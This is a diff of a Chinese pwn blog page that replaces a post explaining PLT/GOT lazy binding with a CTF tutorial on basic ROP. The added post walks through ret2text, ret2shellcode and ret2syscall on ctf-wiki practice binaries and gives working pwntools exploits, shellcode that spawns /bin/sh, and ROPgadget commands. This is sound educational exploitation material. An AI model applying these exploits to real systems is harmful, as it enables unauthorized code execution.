@@ -18,27 +18,26 @@
   <meta name="author" content="Xkeo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="PLT&amp;GOT表以及延迟绑定机制一、ELF简述​    ELF文件（The Executable and Linking Format）是linux环境中的一种二进制可执行文件；elf的基本信息存在于ELF header(ELF头部信息)，其中包括程序运行架构（32位&#x2F;64位），大端序&#x2F;小端序存储，ELF文件大小等等，可以通过readelf -h 来查看头部信息；elf可以包含很多节(se">
+    <meta name="description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PLT表andGOT表以及延迟绑定机制">
-<meta property="og:url" content="http://www.kk-blog.top/2023/04/20/PLT%E8%A1%A8&GOT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/index.html">
+<meta property="og:title" content="基本ROP">
+<meta property="og:url" content="http://www.kk-blog.top/2023/04/02/%E5%9F%BA%E6%9C%ACROP/index.html">
 <meta property="og:site_name" content="Xkeo&#39;s Blog">
-<meta property="og:description" content="PLT&amp;GOT表以及延迟绑定机制一、ELF简述​    ELF文件（The Executable and Linking Format）是linux环境中的一种二进制可执行文件；elf的基本信息存在于ELF header(ELF头部信息)，其中包括程序运行架构（32位&#x2F;64位），大端序&#x2F;小端序存储，ELF文件大小等等，可以通过readelf -h 来查看头部信息；elf可以包含很多节(se">
+<meta property="og:description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic.imgdb.cn/item/6440ff800d2dde57778bce31.jpg">
-<meta property="article:published_time" content="2023-04-20T08:48:25.000Z">
-<meta property="article:modified_time" content="2023-04-20T12:24:15.637Z">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6440a5590d2dde57770cf228.jpg">
+<meta property="article:published_time" content="2023-04-02T03:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-23T04:48:30.657Z">
 <meta property="article:author" content="Xkeo">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic.imgdb.cn/item/6440ff800d2dde57778bce31.jpg">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/6440a5590d2dde57770cf228.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>PLT表andGOT表以及延迟绑定机制 - Xkeo&#39;s Blog</title>
+  <title>基本ROP - Xkeo&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -230,13 +229,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://pic.imgdb.cn/item/6441002e0d2dde57778ca902.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://pic.imgdb.cn/item/644131d70d2dde5777cf2a0a.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PLT表andGOT表以及延迟绑定机制"></span>
+            <span id="subtitle" data-typed-text="基本ROP"></span>
           
         </div>
 
@@ -247,8 +246,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-20 16:48" pubdate>
-          星期四, 四月 20日 2023, 4:48 下午
+        <time datetime="2023-04-02 11:00" pubdate>
+          星期日, 四月 2日 2023, 11:00 上午
         </time>
       </span>
     
@@ -259,7 +258,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.9k 字
+          2.5k 字
         
       </span>
     
@@ -270,7 +269,7 @@
         
         
         
-          25 分钟
+          21 分钟
         
       </span>
     
@@ -308,87 +307,59 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">PLT表andGOT表以及延迟绑定机制</h1>
+            <h1 style="display: none">基本ROP</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="PLT-amp-GOT表以及延迟绑定机制"><a href="#PLT-amp-GOT表以及延迟绑定机制" class="headerlink" title="PLT&amp;GOT表以及延迟绑定机制"></a>PLT&amp;GOT表以及延迟绑定机制</h1><h2 id="一、ELF简述"><a href="#一、ELF简述" class="headerlink" title="一、ELF简述"></a>一、ELF简述</h2><p>​    ELF文件（The Executable and Linking Format）是linux环境中的一种二进制可执行文件；elf的基本信息存在于ELF header(ELF头部信息)，其中包括程序运行架构（32位/64位），大端序/小端序存储，ELF文件大小等等，可以通过<strong>readelf -h <elf_name></strong>来查看头部信息；elf可以包含很多<strong>节(section)</strong>，节都记录在一张称为“节头表”的数组中，具体可用<strong>readelf -S <elf_name></strong>查看，主要包括：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">名称</th>
-<th style="text-align:center">作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">.text</td>
-<td style="text-align:center">存放程序运行时的代码</td>
-</tr>
-<tr>
-<td style="text-align:center">.rodata</td>
-<td style="text-align:center">存放一些如字符串等不可被修改的数据</td>
-</tr>
-<tr>
-<td style="text-align:center">.data</td>
-<td style="text-align:center">存放已经初始化的可修改的数据</td>
-</tr>
-<tr>
-<td style="text-align:center">.bss</td>
-<td style="text-align:center">存放未被初始化的可修改的数据</td>
-</tr>
-<tr>
-<td style="text-align:center">.plt与.got</td>
-<td style="text-align:center">存放程序动态链接函数地址</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>​    elf在加载到内存时，elf文件中的节会被映射未程序中的<strong>段（segment）</strong>，映射的机制是根据<strong>各个节的权限</strong>来进行映射的。例如，只读的节被映射到一个段，可读可写的节被映射到另外一个段。</p>
-<p>如图所示：</p>
-<p><img src="https://pic.imgdb.cn/item/6440d76a0d2dde577751f1de.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h2 id="二、静态编译与动态编译"><a href="#二、静态编译与动态编译" class="headerlink" title="二、静态编译与动态编译"></a>二、静态编译与动态编译</h2><p>​    动态链接库：存放系统函数的库文件。    </p>
-<p>​    一个程序在运行的过程中会调用各种各样的函数；其中，一些函数我们并没有实现，而是调用的库函数。那么我们就需要在编译的时候做一定的操作——静态编译或动态编译，以利用我们想要的库函数。</p>
-<p>​    静态编译会把可能用到的库函数全部编译进可执行文件中。在程序运行过程中不会依赖动态链接库，因为没有寻找库函数这一步，运行速度相对快些；但是同样这也是它的缺点，编译时间长，程序占用内存大。</p>
-<p>​    动态编译则与静态编译相反，在运行时，当它遇到系统函数时，再去动态链接库中寻找——PLT&amp;GOT表。优点是减少了函数占用的内存，加快了编译的速度；但缺点是及其依赖动态链接库，可能在本地能运行，到了另外的一个环境，由于动态链接库版本差异，导致无法运行。</p>
-<h2 id="三、延迟绑定机制"><a href="#三、延迟绑定机制" class="headerlink" title="三、延迟绑定机制"></a>三、延迟绑定机制</h2><h3 id="PLT-amp-GOT表"><a href="#PLT-amp-GOT表" class="headerlink" title="PLT&amp;GOT表"></a>PLT&amp;GOT表</h3><p>​    <strong>PLT（Procedure Linkage Table，程序链接表）</strong>是Linux ELF文件中用于延迟绑定的表。无论是第几次调用外部函数，程序真正调用的其实是PLT表。PLT表其实是由一段段汇编指令构成的，位于code段。</p>
-<p>​    <strong>GOT（Global Offset Table，全局偏移表）</strong>是数据段用于地址无关码的Linux ELF文件中确定全局变量和外部函数地址的表。ELF中有.got和.got.plt两个GOT表。.got表用于全局变量的引用地址，.got.plt用于保存函数引用的地址，位于data段。</p>
-<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
-<p>如图：</p>
-<p><img src="https://pic.imgdb.cn/item/6440eb630d2dde5777704379.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>​    上述过程能够成功执行的前提是plt表中存放的got表里存放着正确的函数地址，但是如果程序在第一次执行时，就对所有函数进行重定位是很麻烦的。因此，linux引入延迟绑定机制。</p>
-<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>​    只有动态库函数被调用时，才会地址解析和重定位工作，为此我们可以使用类似这样的代码来实现：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="hljs-type">void</span> <span class="hljs-built_in">printf</span>@plt()<br>&#123;<br>	address_good:<br>    	jmp *<span class="hljs-built_in">printf</span>@got   <br>	lookup_printf:<br>    	调用重定位函数查找 <span class="hljs-built_in">printf</span> 地址，并写到 <span class="hljs-built_in">printf</span>@got<br>		<span class="hljs-keyword">goto</span> address_good;<span class="hljs-comment">//再返回去执行address_good</span><br>&#125;<br></code></pre></td></tr></table></figure>
-<p>​    解释：当第一次执行函数时，printf@got是lookup_printf的地址，lookup_printf用来寻找printf（）函数的地址，然后写入printf@got表中，它执行完后会返回address_good，再次jmp时，就会直接跳转到printf（）函数执行。</p>
-<p>​    整个逻辑其实并不难理解，现在我们有了一个新的问题——lookup_printf是怎么找到printf（）函数正确的地址的？</p>
-<p>​    写个程序来找找答案：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello pwn!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>​    gdb调试一下，当函数调用printf()时，发生了什么</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401040</span>       &lt;<span class="hljs-built_in">printf</span>@plt&gt;                      endbr64 <br><span class="hljs-number">0x401044</span>       &lt;<span class="hljs-built_in">printf</span>@plt+<span class="hljs-number">4</span>&gt;                    bnd jmp qword ptr [rip + <span class="hljs-number">0x2fb5</span>]     &lt;<span class="hljs-number">0x401030</span>&gt; <span class="hljs-comment">//去lookup_printf的地址</span><br></code></pre></td></tr></table></figure>
-<p>​    接着</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401034</span>                                         push   <span class="hljs-number">0</span> <span class="hljs-comment">//压入一个参数</span><br><span class="hljs-number">0x401039</span>                                         bnd jmp <span class="hljs-number">0x401020</span>                     &lt;<span class="hljs-number">0x401020</span>&gt;<span class="hljs-comment">//去下一个表项</span><br></code></pre></td></tr></table></figure>
-<p>​    接下来继续</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x401020</span>                                         push   qword ptr [rip + <span class="hljs-number">0x2fca</span>]      &lt;_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">8</span>&gt; <span class="hljs-comment">//压入另一个参数</span><br><span class="hljs-number">0x401026</span>                                         bnd jmp qword ptr [rip + <span class="hljs-number">0x2fcb</span>]     &lt;_dl_runtime_resolve_xsavec&gt;<span class="hljs-comment">//跳去执行dl_resolve函数</span><br></code></pre></td></tr></table></figure>
-<p>​    总结一下，按照上述描述，寻址过程：xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共 @got-&gt; _dl_runtime_resolve</p>
-<p>​    到这里，我们还需要知道_dl_runtime_resolve是怎么找到printf()的，以及找到之后，它怎么知道填回哪个GOT表呢？</p>
-<p>​    其实，观察前面的汇编代码，我们可以看到在跳转之前，都会压入一个参数，而每个需要寻找的函数压入的参数是不一样的，这就相当于函数的“身份证”，直接告诉_dl_runtime_resolve要找什么函数。</p>
-<p>​    在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息，当_dl_runtime_resolve找到函数之后，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址，根据大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量。</p>
-<p><img src="https://pic.imgdb.cn/item/6440f7560d2dde5777802dc2.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>​    补充：</p>
-<p>​        除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>
-<p>​        <strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p>
-<p>​        <strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p>
-<p>​        <strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>
-<p>​        动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
-<p><strong>在网上找了张大佬画的流程图：</strong></p>
-<p>​    第一次执行：</p>
-<p><img src="https://pic.imgdb.cn/item/6440f8b00d2dde5777822fdd.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>之后再次调用：</p>
-<p><img src="https://pic.imgdb.cn/item/6440f8d70d2dde5777826d34.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
-<h2 id="感悟（纯自己发电，可忽略（如果有人看的话））"><a href="#感悟（纯自己发电，可忽略（如果有人看的话））" class="headerlink" title="感悟（纯自己发电，可忽略（如果有人看的话））"></a>感悟（纯自己发电，可忽略（如果有人看的话））</h2><p>​    如果上述观点有任何问题，还望各位大佬指正。</p>
-<p>​    感觉PLT&amp;GOT说难也不难，但平时做题的时候，总是感觉逻辑不通，所以写这篇博客，上述流程图都是网上大佬（本来想给大佬留个名，结果他也是偷别人的，那就套娃呗，哈哈哈哈哈）做的，确实本人没那个水平。</p>
+                <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</strong>。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<ol>
+<li><p>程序存在溢出，并且可以控制返回地址。</p>
+</li>
+<li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
+</li>
+</ol>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
+<p><strong>查看一下程序的保护机制</strong><br><img src="" srcset="/img/loading.gif" lazyload alt=""><br>可以看到这是开启了NX保护的32位程序</p>
+<p><strong>ida查看代码</strong><br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>主程序中使用了gets函数，存在栈溢出。</p>
+<p>在.text段发现<br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>得到地址0X0804863A，我们只需要把这个地址覆盖到会返回地址即可。</p>
+<p><strong>求偏移</strong></p>
+<p>利用cyclic 200生成200个垃圾数据<br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>运行输入后</p>
+<p><img src="" srcset="/img/loading.gif" lazyload alt=""><br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>偏移量为112</p>
+<p><strong>exp</strong><br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br><br>address = p32(<span class="hljs-number">0x804863a</span>)<br>offset = <span class="hljs-number">112</span><br><br>payload = offset*b<span class="hljs-string">&#x27;a&#x27;</span> + address<br><br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><br>运行<br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>文件:<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
+<p><strong>查看一下程序的保护机制</strong></p>
+<p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png" srcset="/img/loading.gif" lazyload alt=""><br>没有任何保护</p>
+<p>ida查看代码</p>
+<p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png" srcset="/img/loading.gif" lazyload alt=""><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png" srcset="/img/loading.gif" lazyload alt=""><br>具有可执行权限</p>
+<p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>运行输入后</p>
+<p><img src="" srcset="/img/loading.gif" lazyload alt=""><br><img src="" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>偏移量为112</p>
+<p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p>
+<p><strong>exp</strong><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure></p>
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，可直接突破NX保护，获取 shell。</p>
+<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>文件：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
+<p><strong>检测保护</strong><br><img src="https://pic.imgdb.cn/item/63ede4faf144a0100701c905.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>ida查看源码</strong><br><img src="https://pic.imgdb.cn/item/63ede589f144a01007028cbb.png" srcset="/img/loading.gif" lazyload alt=""><br>依然是gets函数溢出</p>
+<p>利用cyclic方法查到偏移量还是112</p>
+<p><strong>接着利用系统调用来获取shell</strong><br><img src="https://pic.imgdb.cn/item/63ede698f144a01007043373.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>查找”pop eax; ret”</strong><br>命令：ROPgadget —binary ret2syscall —only “pop|ret” | grep “eax”<br><img src="https://pic.imgdb.cn/item/63ede7bdf144a0100706266d.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>查找”pop ebx, pop ecx, pop edx; ret”</strong><br>命令：ROPgadget —binary ret2syscall —only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”<br><img src="https://pic.imgdb.cn/item/63ede8bbf144a010070779dc.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>查找”/bin/sh”</strong><br>命令：ROPgadget —binary ret2syscall —string “/bin/sh”<br><img src="https://pic.imgdb.cn/item/63ede95cf144a0100708449b.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>查找”int 0x80”</strong><br>命令：ROPgadget —binary ret2syscall —only “int” | grep “0x80”<br><img src="https://pic.imgdb.cn/item/63edea55f144a010070a35cc.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>找到所有条件之后，构造exp</strong><br><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&quot;linux&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span> = <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">offset</span> = 112</span><br><span class="hljs-function"><span class="hljs-title">pop_eax</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080bb196)</span></span><br><span class="hljs-function"><span class="hljs-title">pop_edx_ecx_ebx</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0806eb90)</span></span><br><span class="hljs-function"><span class="hljs-title">bin_sh</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080be408)</span></span><br><span class="hljs-function"><span class="hljs-title">int_0x80</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x08049421)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">flat</span><span class="hljs-params">([b<span class="hljs-string">&quot;a&quot;</span> * offset, pop_eax, <span class="hljs-number">0</span>xb, pop_edx_ecx_ebx, p32(<span class="hljs-number">0</span>), p32(<span class="hljs-number">0</span>), bin_sh, int_0x80])</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure></p>
 
                 
               </div>
@@ -424,8 +395,6 @@
       
         <a href="/tags/pwn/">#pwn</a>
       
-        <a href="/tags/linux/">#linux</a>
-      
     </div>
   
 </div>
@@ -436,8 +405,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PLT表andGOT表以及延迟绑定机制</div>
-      <div>http://www.kk-blog.top/2023/04/20/PLT表&amp;GOT表以及延迟绑定机制/</div>
+      <div>基本ROP</div>
+      <div>http://www.kk-blog.top/2023/04/02/基本ROP/</div>
     </div>
     <div class="license-meta">
       
@@ -449,7 +418,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年4月20日</div>
+          <div>2023年4月2日</div>
         </div>
       
       
@@ -481,9 +450,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/30/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">
+                      <a href="/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">栈迁移</span>
+                        <span class="hidden-mobile">格式化字符串漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -491,8 +460,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">
-                        <span class="hidden-mobile">格式化字符串漏洞</span>
+                      <a href="/2023/04/01/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="pwn基础知识">
+                        <span class="hidden-mobile">pwn基础知识</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
